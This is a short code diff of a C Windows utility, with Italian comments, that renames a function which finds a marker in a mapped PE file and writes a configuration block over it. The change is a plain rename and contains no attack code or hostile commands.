@@ -7,7 +7,7 @@
 
 #define CONFIG_MARK_LEN 64
 
-bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len);
+bool EmbedConfig(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len);
 
 HANDLE hPEFileCore;
 HANDLE hMappedFileCore;
@@ -136,7 +136,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	}
 
 	// Patching della configurazione
-	if (FindMemMarker(pCorePtr, iLen, (BYTE *) pConfigPtr, iConfigLen, CONFIG_MARK, CONFIG_MARK_LEN))
+	if (EmbedConfig(pCorePtr, iLen, (BYTE *) pConfigPtr, iConfigLen, CONFIG_MARK, CONFIG_MARK_LEN))
 		printf("Config name embedded... ok\n");
 	else {
 		printf("Cannot embed Config Name [%S]\n", wsOutFile);
@@ -168,7 +168,7 @@ int _tmain(int argc, _TCHAR* argv[])
 
 
 // cerca in pBlockPtr il marker mark_b, quando lo trova scrive block per la sua lunghezza
-bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len)
+bool EmbedConfig(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len)
 {
 	BYTE *pDataSect	= NULL;
 	bool iRet = false;
